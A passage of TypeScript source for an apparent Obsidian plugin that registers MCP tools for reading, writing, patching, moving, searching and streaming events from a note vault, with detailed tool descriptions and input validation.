        Subscribe to one Obsidian event and return a signed URL that streams matching occurrences as Server-Sent Events (text/event-stream). The URL needs no API key, so a process on your host can follow it -- \`curl -N <url>\`, or an EventSource in a browser -- and act on each event as it arrives. Each message's \`event:\` field is the event name, its \`id:\` is \`<epoch>-<counter>\` (a new epoch or a gap in the counter means events were missed; nothing is replayed), and its data is a JSON object: {emitter, event, path, file}, where file is the NoteJson search_query evaluates (without content unless your filter reads file.content), plus oldPath on vault rename, isFolder on vault events, previous ({frontmatter, tags}) on metadataCache deleted, and viewType on workspace active-leaf-change.

        Streamable events -- ${supported}. For "a note's frontmatter changed", prefer metadataCache changed over vault modify: vault modify fires before Obsidian has re-read the file's metadata.

        The optional filter is a JsonLogic expression evaluated against that data object, with the same extra operators as search_query (glob, regexp); only events for which it is truthy are sent. Examples: {"glob": ["journal/*", {"var": "path"}]}; {"==": [{"var": "file.frontmatter.status"}, "done"]}. The URL expires after ttlSeconds (default: the server's signed-URL lifetime); a stream opened before then stays open, but reconnecting after it is refused and needs a new URL. At most 16 streams may be open at once. Anyone holding the URL sees the path and metadata of every matching event, and note content if the filter reads file.content.
      `,
      {
        emitter: z.enum(EVENT_EMITTERS).describe("The Obsidian object whose event to follow"),
        event: z.string().describe(`The event name, one of those listed for the emitter`),
        filter: z
          .record(z.unknown())
          .optional()
          .describe("JsonLogic expression events must satisfy; omit to receive every occurrence"),
        ttlSeconds: z
          .number()
          .int()
          .optional()
          .describe("How long the URL stays valid, in seconds (clamped to 10-86400)"),
      },
      READ_ONLY_ANNOTATIONS,
      async ({
        emitter,
        event,
        filter,
        ttlSeconds,
      }: {
        emitter: (typeof EVENT_EMITTERS)[number];
        event: string;
        filter?: Record<string, unknown>;
        ttlSeconds?: number;
      }) => {
        if (!isStreamableEvent(emitter, event)) {
          throw new Error(
            `"${event}" is not a streamable ${emitter} event. Choose one of: ${STREAMABLE_EVENTS[emitter].join(", ")}.`,
          );
        }
        const hasFilter = filter !== undefined && Object.keys(filter).length > 0;
        const grant = events.createListener(
          emitter,
          event,
          hasFilter ? filter : null,
          clampSignedUrlTtl(ttlSeconds ?? this.signedUrlTtlSeconds),
          this.baseUrlFromRequest(),
          this.signer,
        );
        return this.text({
          url: grant.url,
          expiresAt: grant.expiresAt,
          command: `curl -N ${shellQuote(grant.url)}`,
        });
      },
    );
  }

  private registerTools(): void {
    this.tool(
      "vault_list",
      dedent`List files and subdirectories inside a vault directory. Returns an array of names; directory entries end with '/'. Omit path or pass an empty string to list the vault root.`,
      { path: z.string().optional().describe("Directory path relative to vault root (default: root)") },
      READ_ONLY_ANNOTATIONS,
      async ({ path }: { path?: string }) => {
        const files = await this.ops.listVaultDirectory(
          this.vaultPath(path ?? "", "Directory path"),
        );
        return this.text({ files });
      },
    );

    this.tool(
      "vault_read",
      dedent`
        Read a vault file's content and metadata. Returns a JSON object with: content (full markdown text), path, tags (array of tag strings), frontmatter (parsed YAML front-matter as an object), stat ({ctime, mtime, size}), links (array of vault-relative paths this file links to), backlinks (array of vault-relative paths of files that link here), and unresolvedLinks (array of link text in this file that does not resolve to an existing vault file). Throws if the file does not exist.

        When targetType and target are both provided, returns only the matched section as a plain string (markdown) or JSON value (frontmatter) instead of the full object. To save context, call vault_get_document_map first to identify headings, block IDs, or frontmatter keys, and prefer targeted reads over full reads for anything but short files.

        This tool reads text. A file whose bytes are not valid UTF-8 — an image, a PDF, any attachment — is refused rather than returned as the lossy string decoding it would produce; read those with vault_read_binary instead.
      `,
      {
        path: z.string().describe(VAULT_PATH_DESCRIPTION),
        targetType: z
          .enum(["heading", "block", "frontmatter"])
          .optional()
          .describe("Type of section to extract: 'heading', 'block' reference, or 'frontmatter' key"),
        target: z
          .union([z.array(z.string()), z.string()])
          .optional()
          .describe(
            dedent`Section to extract. For a heading: an array of heading texts naming the path from the top level down to the target (e.g. ["Heading 1","Subheading"]) — a bare string is rejected, even for a single top-level heading. If a heading is a duplicate of an earlier sibling, its map key carries an extra non-printable marker suffix; copy that key verbatim from vault_get_document_map, don't retype it. For a block: the bare block id without '^' — likewise, a duplicate block id's later occurrence carries the same kind of marker suffix in vault_get_document_map's blocks list. For a frontmatter field: the key name. Use vault_get_document_map to discover valid heading paths and block ids.`,
          ),
        scope: z
          .enum(["content", "marker", "markerAndContent"])
          .optional()
          .describe(
            dedent`Which part of the target to read (default 'content'), mirroring vault_patch's scopes: what a scope returns is exactly what a 'replace' at that scope consumes. 'content': the node's body — a heading's body with levels made relative to it, a block's text, a frontmatter value. 'marker': the label — a heading's raw text (no '#'s, no duplicate-marker suffix), a block's bare id, a frontmatter key. 'markerAndContent': the whole node — a heading's subtree with its own line as '# Title' (levels relative to its parent), a block's full span including its '^id', a frontmatter entry as a {key: value} object. Requires targetType and target.`,
          ),
      },
      READ_ONLY_ANNOTATIONS,
      async ({
        path,
        targetType,
        target,
        scope,
      }: {
        path: string;
        targetType?: "heading" | "block" | "frontmatter";
        target?: string[] | string;
        scope?: "content" | "marker" | "markerAndContent";
      }) => {
        const filePath = this.vaultPath(path);
        const file = this.ops.app.vault.getAbstractFileByPath(filePath);
        if (!(file instanceof TFile)) throw new Error(`File not found: ${path}`);
        if ((targetType == null) !== (target == null)) {
          throw new Error("targetType and target must be provided together");
        }
        if (scope !== undefined && (targetType == null || target == null)) {
          throw new Error("scope requires targetType and target");
        }
        // Read once, up front, and hand the text to whichever path answers: a malformed
        // argument should not cost a file read, but neither should a targeted read of a
        // file this tool is about to refuse.
        const content = await this.readTextStrict(filePath);
        if (targetType && target != null) {
          let address: ReadTarget;
          if (targetType === "heading") {
            const heading =
              typeof target === "string" ? parseStringHeadingTarget(target) : target;
            if (!Array.isArray(heading)) {
              throw new Error(
                `A heading target must be an array of heading texts, not a bare string (${HEADING_TARGET_STRING_HINT})`,
              );
            }
            address = { targetType: "heading", target: heading };
          } else {
            if (Array.isArray(target)) {
              throw new Error(`A ${targetType} target must be a string, not an array`);
            }
            address = { targetType, target };
          }
          if (scope !== undefined) {
            address.scope = scope;
          }
          const result = await this.ops.readFileSectionMdp2(file, address, content);
          return this.text(result.kind === "frontmatter" ? result.value : result.content);
        }
        const meta = await this.ops.getFileMetadataObject(file, undefined, true, content);
        return this.text(meta);
      },
    );

    this.tool(
      "vault_write",
      dedent`Create or overwrite a vault file with the given content. Text only: a path whose extension names an image, audio, video, font, PDF or archive type is refused, as is content containing a NUL byte, because writing text there would corrupt the file -- upload those bytes with vault_get_upload_url, or PUT /vault/<path> over the REST API. Creates any missing parent directories automatically. Overwrites without warning if the file already exists.`,
      {
        path: z.string().describe(VAULT_PATH_DESCRIPTION),
        content: z.string().describe("Full file content (markdown text)"),
      },
      { readOnlyHint: false, destructiveHint: true, idempotentHint: true, openWorldHint: false },
      async ({ path, content }: { path: string; content: string }) => {
        assertTextWrite(path, content);
        await this.ops.writeFileContent(this.vaultPath(path), content);
        return this.text({ message: "OK" });
      },
    );

    this.tool(
      "vault_read_binary",
      dedent`
        Read a non-text vault file: an image, PDF, audio, any attachment. A raster image comes back as an image block (downscaled to fit ${MaximumImageEdge}px) plus a text block with its path, mimeType, size, width, and height. An image still larger than ${MaximumMcpBinaryBytes} bytes once downscaled comes back as a resource_link instead, the same as any other oversized file -- or, when signed URLs are off and there is no link to give, is refused with a pointer at the REST endpoint. Since many clients do not show a resource_link to the person, do not leave them with nothing: if you can fetch a URL and put a local file in front of them, download the link to scratch space and show them that file -- the picture reaches them without its bytes passing through your context, and do not read the download back in yourself. Failing that, say why they are getting a link and repeat it in your reply. An SVG comes back unchanged, as its source text in a resource block. Anything else comes back as a resource_link to a signed download URL when signed URLs are enabled, or embedded base64 when they are not and the file is under ${MaximumMcpBinaryBytes} bytes.

        as overrides that: 'bytes' embeds the raw bytes (under ${MaximumMcpBinaryBytes} bytes only); 'link' returns a signed download URL instead of any bytes. Throws if the file does not exist.
      `,
      {
        path: z.string().describe("File path relative to vault root"),
        as: z
          .enum(["auto", "bytes", "link"])
          .optional()
          .describe("How to return the file: 'auto' (default), 'bytes', or 'link'"),
      },
      READ_ONLY_ANNOTATIONS,
      async ({ path, as }: { path: string; as?: BinaryReadMode }) => {
        const mode: BinaryReadMode = as ?? "auto";
        const normalized = this.normalizedFilePath(path);
        if (mode === "link") {
          if (!this.signedUrlsEnabled) {
            throw new Error(`Cannot return a link: ${SIGNED_URLS_DISABLED_HINT}`);
          }
          return this.downloadLinkResult(normalized);
        }
        const mimeType = mime.lookup(normalized) || "application/octet-stream";
        const isSvg = mimeType === SVG_MIME_TYPE;
        const isRaster = !isSvg && mimeType.startsWith("image/");
        // Decide from the stat wherever the stat can decide, because reading first meant
        // pulling a multi-gigabyte file into the renderer only to discard it -- the sort
        // of allocation that kills the renderer outright (see MaximumMcpBinaryBytes).
        //
        // The one thing that can come back *smaller* than it is on disk is a raster image
        // this runtime has a scaler for, in `auto` mode. An SVG is returned as its own
        // source, a raster image with no scaler is passed through untouched, and `bytes`
        // mode skips the scaler entirely -- so in every other case the file's size already
        // determines the outcome and the read buys nothing.
        const canReduce = mode === "auto" && isRaster && this.imageScaler !== null;
        if (!canReduce) {
          const size = this.existingFile(normalized).stat.size;
          if (size > MaximumMcpBinaryBytes) {
            if (mode === "auto" && this.signedUrlsEnabled) {
              return this.downloadLinkResult(normalized);
            }
            this.throwOversizedForEmbedding(size);
          }
        }
        // Nothing but an SVG or a raster image needs the bytes in hand at all; with signed
        // URLs on, everything else is a link.
        if (mode === "auto" && this.signedUrlsEnabled && !isSvg && !isRaster) {
          return this.downloadLinkResult(normalized);
        }
        // The post-read checks in `svgTextResult`, `imageResult` and `embeddedBytesResult`
        // stay: they bound what the scaler actually produced, which no stat can predict.
        const bytes = await this.ops.readBinaryFileContent(normalized);
        if (mode === "auto" && mimeType === SVG_MIME_TYPE) {
          const svg = this.svgTextResult(normalized, bytes);
          if (svg) return svg;
        } else if (mode === "auto" && mimeType.startsWith("image/")) {
          const image = await this.imageResult(normalized, bytes, mimeType);
          if (image) return image;
        }
        if (mode === "auto" && this.signedUrlsEnabled) {
          return this.downloadLinkResult(normalized);
        }
        return this.embeddedBytesResult(normalized, bytes, mimeType);
      },
    );

    this.tool(
      "vault_append",
      dedent`Append content to the end of a vault file. Creates the file if it does not already exist. Text only, on the same terms as vault_write: a path whose extension names a binary type is refused, as is content containing a NUL byte.`,
      {
        path: z.string().describe(VAULT_PATH_DESCRIPTION),
        content: z.string().describe("Content to append"),
      },
      { readOnlyHint: false, destructiveHint: false, idempotentHint: false, openWorldHint: false },
      async ({ path, content }: { path: string; content: string }) => {
        assertTextWrite(path, content);
        await this.ops.appendFileContent(this.vaultPath(path), content);
        return this.text({ message: "OK" });
      },
    );

    this.tool(
      "vault_patch",
      dedent`
        Edit a vault file with a single structured instruction: an operation applied to a scope of a target node.

        - operation: 'replace', 'prepend', 'append', or 'delete'.
        - scope (default 'content'): 'content' = the node's body; 'marker' = its label (heading line / block '^id' / frontmatter key); 'markerAndContent' = the whole node/subtree; 'parent' = the node's place in the tree (heading move only).
        - The payload rides in exactly one field, chosen by what it is: 'content' (a markdown/text string), 'value' (arbitrary JSON — a frontmatter value, or a 2-D array of row cells to write table rows on a block target's 'content' cell), or 'destination' (where a moved heading lands).

        Heading levels inside a 'content' string are relative to the target (a leading '#' becomes a direct child), so you never count '#'s. To discover valid heading paths and block IDs first, call vault_get_document_map.

        To continue an existing block instead of starting a new one, add 'within' (heading targets only): an index picking one of the section's top-level body blocks (0-based, negative from the end; isolated '^id' lines are not counted). 'content'-scope edits then splice literally into that block — append with '\\n- item' extends a list — and 'markerAndContent' prepend/append insert a new block beside it. Read the file first to count blocks, and pair with 'ifMatch'.
      `,
      {
        path: z.string().describe(VAULT_PATH_DESCRIPTION),
        // The instruction fields (targetType, target, operation, scope,
        // content, value, destination, ifMatch, and the two flags) come
        // straight from markdown-patch-2's published schema, so the tool input,
        // the engine's validation, and the OpenAPI `PatchInstruction` component
        // are all one definition and cannot drift.
        ...InstructionInputObjectSchema.shape,
      },
      { readOnlyHint: false, destructiveHint: true, idempotentHint: false, openWorldHint: false },
      async ({
        path,
        targetType,
        target,
        within,
        operation,
        scope,
        content,
        value,
        destination,
        ifMatch,
        createTargetIfMissing,
        rejectIfContentPreexists,
      }: {
        path: string;
        targetType: "heading" | "block" | "frontmatter";
        target: string[] | string | null;
        within?: number;
        operation: "replace" | "prepend" | "append" | "delete";
        scope?: "content" | "marker" | "markerAndContent" | "parent";
        content?: string;
        value?: unknown;
        destination?: unknown;
        ifMatch?: string;
        createTargetIfMissing?: boolean;
        rejectIfContentPreexists?: boolean;
      }) => {
        // Heading targets only: block/frontmatter targets are legitimately
        // strings and must never be JSON-parsed.
        let normalizedTarget = target;
        if (targetType === "heading" && typeof target === "string") {
          const parsed = parseStringHeadingTarget(target);
          if (parsed === undefined) {
            throw new Error(
              `target: a heading target must be an array of heading texts, or null for the document root, not a bare string (${HEADING_TARGET_STRING_HINT})`,
            );
          }
          normalizedTarget = parsed;
        }
        // Assemble the instruction with exactly the fields that were supplied,
        // so the engine sees the discriminated-union shape it expects. It
        // validates the operation×scope×targetType combination and the carrier.
        const instruction: Record<string, unknown> = {
          targetType,
          target: normalizedTarget,
          operation,
          ...(within !== undefined ? { within } : {}),
          ...(scope !== undefined ? { scope } : {}),
          ...(content !== undefined ? { content } : {}),
          ...(value !== undefined ? { value } : {}),
          ...(destination !== undefined ? { destination } : {}),
          ...(ifMatch !== undefined ? { ifMatch } : {}),
          ...(createTargetIfMissing !== undefined ? { createTargetIfMissing } : {}),
          ...(rejectIfContentPreexists !== undefined ? { rejectIfContentPreexists } : {}),
        };
        try {
          const result = await this.ops.patchFileSectionMdp2(
            this.vaultPath(path),
            instruction as InstructionInput,
          );
          return result.warnings.length > 0
            ? this.text({ message: "OK", warnings: result.warnings })
            : this.text({ message: "OK" });
        } catch (e) {
          // Surface the engine's message to the caller.
          throw e instanceof Error ? e : new Error(String(e));
        }
      },
    );

    this.tool(
      "vault_delete",
      dedent`Delete a file from the vault. Throws if the file does not exist. By default, moves the file to trash (following the user's Obsidian "Deleted files" preference — either the ".trash" folder or the system trash) rather than deleting it permanently.`,
      {
        path: z.string().describe(VAULT_PATH_DESCRIPTION),
        permanent: z
          .boolean()
          .optional()
          .describe(
            "If true, permanently deletes the file instead of moving it to trash (default: false).",
          ),
      },
      { readOnlyHint: false, destructiveHint: true, idempotentHint: false, openWorldHint: false },
      async ({ path, permanent }: { path: string; permanent?: boolean }) => {
        await this.ops.deleteVaultFile(this.vaultPath(path), permanent ?? false);
        return this.text({ message: "OK" });
      },
    );

    this.tool(
      "vault_move",
      dedent`Move (rename) a vault file to a new path. Creates any missing parent directories at the destination automatically. Preserves file history and updates internal Obsidian links. Throws if the source file does not exist.`,
      {
        path: z.string().describe(SOURCE_VAULT_PATH_DESCRIPTION),
        destination: z
          .string()
          .describe(
            dedent`Destination path relative to vault root; must not escape the vault root. May end with '/' to preserve the source filename in the target directory (e.g. destination 'archive/' moves 'notes/todo.md' to 'archive/todo.md').`,
          ),
        allowOverwrite: z
          .boolean()
          .optional()
          .describe(
            dedent`If true, move proceeds even when a file already exists at the destination; otherwise the move throws (default: false).`,
          ),
      },
      { readOnlyHint: false, destructiveHint: true, idempotentHint: false, openWorldHint: false },
      async ({
        path,
        destination,
        allowOverwrite,
      }: {
        path: string;
        destination: string;
        allowOverwrite?: boolean;
      }) => {
        const source = this.vaultPath(path, "Source path");
        const normalized = this.vaultPath(
          destination.trim().replace(/\\/g, "/").replace(/\/+/g, "/"),
          "Destination path",
        );

        const sourceFilename = source.includes("/")
          ? source.slice(source.lastIndexOf("/") + 1)
          : source;

        const resolvedDestination = !normalized || normalized.endsWith("/")
          ? normalized + sourceFilename
          : normalized;

        const actualPath = await this.ops.moveVaultFile(source, resolvedDestination, allowOverwrite ?? false);
        return this.text({ message: "OK", oldPath: source, newPath: actualPath });
      },
    );

    this.tool(
      "vault_copy",
      dedent`Copy a vault file to a new path. Creates any missing parent directories at the destination automatically. Throws if the source file does not exist.`,
      {
        path: z.string().describe(SOURCE_VAULT_PATH_DESCRIPTION),
        destination: z
          .string()
          .describe(
            dedent`Destination path relative to vault root; must not escape the vault root. May end with '/' to preserve the source filename in the target directory (e.g. destination 'archive/' copies 'notes/todo.md' to 'archive/todo.md').`,
          ),
        allowOverwrite: z
          .boolean()
          .optional()
          .describe(
            dedent`If true, copy proceeds even when a file already exists at the destination; otherwise the copy throws (default: false).`,
          ),
      },
      { readOnlyHint: false, destructiveHint: true, idempotentHint: false, openWorldHint: false },
      async ({
        path,
        destination,
        allowOverwrite,
      }: {
        path: string;
        destination: string;
        allowOverwrite?: boolean;
      }) => {
        const source = this.vaultPath(path, "Source path");
        const normalized = this.vaultPath(
          destination.trim().replace(/\\/g, "/").replace(/\/+/g, "/"),
          "Destination path",
        );

        const sourceFilename = source.includes("/")
          ? source.slice(source.lastIndexOf("/") + 1)
          : source;

        const resolvedDestination = !normalized || normalized.endsWith("/")
          ? normalized + sourceFilename
          : normalized;

        const actualPath = await this.ops.copyVaultFile(source, resolvedDestination, allowOverwrite ?? false);
        return this.text({ message: "OK", sourcePath: source, newPath: actualPath });
      },
    );

    this.tool(
      "vault_get_document_map",
      dedent`
        Return the structure of a vault file as a document map: its heading tree, block reference IDs, and frontmatter field names, plus a version token. Use this before vault_read or vault_patch with targeting to discover what targets are available without parsing the full markdown content yourself.

        headings is a nested object mirroring the document's heading nesting: each heading's text maps to an object of its child headings, and a leaf heading maps to {} (e.g. {"Overview": {"Details": {}}}). To target a heading, use the path of keys from the top level down to it (e.g. ['Overview', 'Details']) as a vault_patch or vault_read heading target. Every occurrence of a heading gets its own key, even a duplicate: the first occurrence keeps its plain text, and each later occurrence's key has an opaque, non-printable marker suffix appended by the server — given '## Log' twice, the tree is {"Log": {}, "Log<marker>": {}}, and both are separately addressable. Always copy such a key verbatim from this response into a vault_read/vault_patch target array; never retype or reconstruct one yourself. blocks are bare reference IDs (no '^'), one entry per block in document order; a duplicate block id gets the same disambiguation treatment as a heading — the first occurrence's entry is the plain id, and each later occurrence's entry carries the same kind of marker suffix, again to be copied verbatim. frontmatterFields are top-level key names. version is a content hash of the file — pass it back as vault_patch's ifMatch to make an edit conditional on the file being unchanged.
      `,
      { path: z.string().describe(VAULT_PATH_DESCRIPTION) },
      READ_ONLY_ANNOTATIONS,
      async ({ path }: { path: string }) => {
        const file = this.ops.app.vault.getAbstractFileByPath(this.vaultPath(path));
        if (!(file instanceof TFile)) throw new Error(`File not found: ${path}`);
        const map = await this.ops.getDocumentMapV2Object(file);
        return this.text(map);
      },
    );

    this.tool(
      "active_file_get_path",
      dedent`Return the vault-relative path of the file currently open in Obsidian. Use this path with vault_read, vault_write, vault_append, vault_patch, vault_get_document_map, or vault_delete to operate on the active file. Throws if no file is active.`,
      {},
      READ_ONLY_ANNOTATIONS,
      async () => {
        const file = this.getActiveFile();
        return this.text({ path: file.path });
      },
    );

    this.tool(
      "search_query",
      dedent`
        Search vault files using a JsonLogic query evaluated against each note's metadata.

        The query is a JSON object evaluated against a NoteJson object for each file; files where the result is truthy are returned.

        Example NoteJson shape:
        {
          "path": "journal/2024-01-15.md",
          "content": "# My note\\n\\nSome content here.",
          "tags": ["daily", "work"],
          "frontmatter": { "status": "done", "url": "https://example.com", "priority": 2 },
          "stat": { "ctime": 1705276800000, "mtime": 1705363200000, "size": 1024 },
          "links": ["projects/foo.md"],
          "backlinks": ["index.md"],
          "unresolvedLinks": ["not-yet-created.md"]
        }

        Call vault_read on any file (without targeting) to see the exact shape for a real file in this vault, including its actual frontmatter fields.

        Useful JsonLogic operators:
        - {"==": [a, b]} — equal
        - {"!=": [a, b]} — not equal
        - {"in": [value, array]} — array contains value
        - {"<": [a, b]}, {">": [a, b]}, {"<=": [a, b]}, {">=": [a, b]} — numeric/string comparison
        - {"and": [...]}, {"or": [...]}, {"!": expr} — boolean logic
        - {"var": "path"} — access a field (use dot notation for nested: "frontmatter.status")
        - {"if": [cond, then, else]} — conditional

        Extra operators beyond standard JsonLogic:
        - {"glob": ["*.foo", {"var": "path"}]} — glob pattern match
        - {"regexp": ["^daily/", {"var": "path"}]} — regular expression match

        Returns an array of {filename, result} objects where result is the truthy value the query produced for that file.

        Examples:
        - Find by tag: {"in": ["myTag", {"var": "tags"}]}
        - Find by frontmatter field: {"==": [{"var": "frontmatter.status"}, "done"]}
        - Find by path glob: {"glob": ["journal/*", {"var": "path"}]}
        - Modified after a date: {">": [{"var": "stat.mtime"}, 1704067200000]}
        - Multiple conditions: {"and": [{"in": ["work", {"var": "tags"}]}, {"==": [{"var": "frontmatter.status"}, "done"]}]}
      `,
      {
        query: z
          .record(z.unknown())
          .describe("JsonLogic query object to evaluate against each note"),
      },
      READ_ONLY_ANNOTATIONS,
      async ({ query }: { query: unknown }) => {
        const results = await this.ops.searchJsonLogic(query);
        return this.text(results);
      },
    );

    this.tool(
      "search_simple",
      dedent`Search vault files using Obsidian's built-in simple search. Returns an array of {filename, score, matches} objects sorted by relevance score. Each match includes the matched text and surrounding context characters (controlled by contextLength).`,
      {
        query: z.string().describe("Search query string"),
        contextLength: z
          .number()
          .optional()
          .describe("Number of characters of surrounding context to return per match (default: 100)"),
      },
      READ_ONLY_ANNOTATIONS,
      async ({ query, contextLength }: { query: string; contextLength?: number }) => {
        const results = await this.ops.simpleSearch(query, contextLength);
        return this.text(results);
      },
    );

    this.tool(
      "tag_list",
      dedent`Return all tags used across the vault, each with a usage count. Tag names do not include the leading '#'. This tool is read-only. To add a tag to a specific file, use vault_patch with targetType 'frontmatter', target 'tags', operation 'append', and value ["tag-name"] (set createTargetIfMissing to true if the file may have no tags yet). To remove a tag, read the current tags list with vault_read, filter client-side, then replace the whole field with vault_patch using operation 'replace' and value set to the filtered list. For full examples, read the OpenAPI spec resource at obsidian://local-rest-api/openapi.yaml.`,
      {},
      READ_ONLY_ANNOTATIONS,
      async () => {
        return this.text({ tags: this.ops.getAllTags() });
      },
    );

    this.tool(
      "command_list",
      dedent`Return all registered Obsidian commands. Each entry has an 'id' and a human-readable 'name'. Pass the 'id' to command_execute to run a command.`,
      {},
      READ_ONLY_ANNOTATIONS,
      async () => {
        return this.text({ commands: this.ops.listCommands() });
      },
    );

    this.tool(
      "command_execute",
      dedent`Execute an Obsidian command by its ID. Use command_list to discover available command IDs. Throws if the command ID does not exist.`,
      { commandId: z.string().describe("The command ID to execute (e.g. 'editor:toggle-bold')") },
      // Command effects are arbitrary and unpredictable (any registered Obsidian command), so
      // this is annotated conservatively as destructive and non-idempotent rather than assumed safe.
      { readOnlyHint: false, destructiveHint: true, idempotentHint: false, openWorldHint: false },
      async ({ commandId }: { commandId: string }) => {
        this.ops.executeCommand(commandId);
        return this.text({ message: "OK" });
      },
    );

    this.tool(
      "open_file",
      dedent`Open a file in the Obsidian UI. If the file does not exist, Obsidian will create a new document at that path. Set newLeaf to true to open in a new pane rather than the current one.`,
      {
        path: z.string().describe(VAULT_PATH_DESCRIPTION),
        newLeaf: z.boolean().optional().describe("Open in a new leaf/pane (default: false)"),
      },
      { readOnlyHint: false, destructiveHint: false, idempotentHint: false, openWorldHint: false },
      async ({ path, newLeaf }: { path: string; newLeaf?: boolean }) => {
        this.ops.openVaultFile(this.vaultPath(path), newLeaf);
        return this.text({ message: "OK" });
      },
    );
  }
}
